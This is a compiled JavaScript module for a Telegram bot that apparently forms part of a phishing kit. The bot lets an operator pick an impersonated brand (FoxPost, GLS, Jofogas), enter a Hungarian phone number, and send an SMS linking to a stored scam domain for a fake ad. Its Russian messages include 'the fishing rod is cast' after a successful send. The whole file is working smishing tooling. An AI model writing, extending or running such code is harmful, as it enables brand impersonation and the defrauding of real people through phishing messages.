"use strict";
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
exports.composer = exports.scene = void 0;
const grammy_scenes_1 = require("grammy-scenes");
const grammy_1 = require("grammy");
const database_1 = require("../../../database");
const deleteAllMessages_1 = require("../../../helpers/deleteAllMessages");
const sms_1 = require("../../../utils/rassilka/sms");
const console_1 = __importDefault(require("console"));
exports.scene = new grammy_scenes_1.Scene('smsSendFacebook');
exports.composer = new grammy_1.Composer();
const regex = /sms ad facebook (?<id>\d+)/gmi;
exports.composer.callbackQuery(regex, handler);
async function handler(ctx) {
    const match = regex.exec(ctx.callbackQuery.data);
    const id = match.groups.id;
    await ctx.scenes.enter('smsSendFacebook', {
        id
    });
}
async function cancel(ctx) {
    await (0, deleteAllMessages_1.deleteAllMessages)(ctx.session.deleteMessage, ctx);
    ctx.scene.exit();
}
exports.scene.always().callbackQuery('cancel smsSendFacebook', cancel);
exports.scene.do(async (ctx) => {
    ctx.session.smsEmail = { ad: Number(ctx.scene.opts.arg.id), to: undefined, pattern: undefined };
    ctx.session.deleteMessage = [];
    const ad = await database_1.adsRepository.findOne({
        where: {
            id: ctx.session.smsEmail.ad
        }
    });
    if (!ad) {
        await ctx.reply(`ad undefined`, {
            reply_markup: {
                inline_keyboard: [
                    [{ text: 'Закрыть', callback_data: 'deleteThisMessage' }]
                ]
            }
        });
        return cancel(ctx);
    }
    const msg = await ctx.reply("<b>🪤 Выбери сервис:</b>", {
        reply_markup: new grammy_1.InlineKeyboard()
            .text('FOXPOST', 'foxpost')
            .row()
            .text('GLS', 'gls')
            .row()
            .text('Отмена', 'cancel smsSendFacebook')
    });
    ctx.session.deleteMessage.push(msg.message_id);
    ctx.scene.resume();
});
exports.scene.wait().callbackQuery(/facebook|foxpost|gls/, async (ctx) => {
    ctx.session.smsEmail.service = ctx.callbackQuery.data;
    try {
        ctx.deleteMessage();
    }
    catch (e) { }
    const ad = await database_1.adsRepository.findOne({
        where: {
            id: ctx.session.smsEmail.ad
        }
    });
    if (!ad) {
        await ctx.reply(`ad undefined`, {
            reply_markup: {
                inline_keyboard: [
                    [{ text: 'Закрыть', callback_data: 'deleteThisMessage' }]
                ]
            }
        });
        return cancel(ctx);
    }
    const msg = await ctx.reply(`📲 Введи номер телефона (🇭🇺+36):\n\n<b>Пример: +3615785425397</b>`, {
        reply_markup: new grammy_1.InlineKeyboard()
            .text('Отмена', 'cancel smsSendFacebook')
    });
    ctx.session.deleteMessage.push(msg.message_id);
    ctx.scene.resume();
});
exports.scene.wait().on('message:text', async (ctx) => {
    ctx.session.smsEmail.to = ctx.msg.text;
    ctx.session.deleteMessage.push(ctx.msg.message_id);
    const ad = await database_1.adsRepository.findOne({
        where: {
            id: ctx.session.smsEmail.ad
        }
    });
    if (!ad) {
        await ctx.reply(`ad undefined`, {
            reply_markup: {
                inline_keyboard: [
                    [{ text: 'Закрыть', callback_data: 'deleteThisMessage' }]
                ]
            }
        });
        return cancel(ctx);
    }
    if (ctx.session.smsEmail.service === 'foxpost') {
        ctx.session.smsEmail.pattern = "1";
        ctx.session.smsEmail.who = "FoxPost";
    }
    if (ctx.session.smsEmail.service === 'facebook') {
        ctx.session.smsEmail.pattern = "1";
        ctx.session.smsEmail.who = "Jofogas";
    }
    if (ctx.session.smsEmail.service === 'gls') {
        ctx.session.smsEmail.pattern = "0";
        ctx.session.smsEmail.who = "GLS";
    }
    const domen = await database_1.domensRepository.findOne({
        where: {
            service: ad.service,
            country: ad.country,
            active: true
        }
    });
    if (!domen) {
        await ctx.reply(`domen undefined`, {
            reply_markup: {
                inline_keyboard: [
                    [{ text: 'Закрыть', callback_data: 'deleteThisMessage' }]
                ]
            }
        });
        return cancel(ctx);
    }
    const msg = await ctx.reply(`⏳`);
    const response = await (0, sms_1.sendSms)(ctx.session.smsEmail.to, ctx.session.smsEmail.pattern, ctx.session.smsEmail.who, `https://${domen.link}/service/${ctx.session.smsEmail.service}/${ad.link}?phone=yes`, ctx.from.id);
    try {
        ctx.api.deleteMessage(ctx.chat.id, msg.message_id);
    }
    catch (e) { }
    console_1.default.log(`sms ${response}`);
    await ctx.reply((response?.info === "Success")
        ? `✅ Удочка закинута`
        : `⚠️ Не удалось отправить смс`, {
        reply_markup: {
            inline_keyboard: [
                [{ text: 'Закрыть', callback_data: 'deleteThisMessage' }]
            ]
        }
    });
    return cancel(ctx);
});
